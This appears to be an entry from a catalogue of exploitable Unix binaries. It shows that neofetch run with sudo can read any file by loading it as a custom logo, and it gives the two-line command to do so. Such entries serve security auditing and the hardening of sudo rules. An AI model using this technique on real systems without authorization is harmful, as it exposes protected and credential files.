---
functions:
  file-read:
    - description: If the Neofetch binary has Sudo permissions, it can be used to read sensitive files on the machine. It will try to load a custom logo to the output, thus loading the sensitive file.
      code: |
        LFILE=file_to_read
        sudo neofetch --ascii $LFILE
---
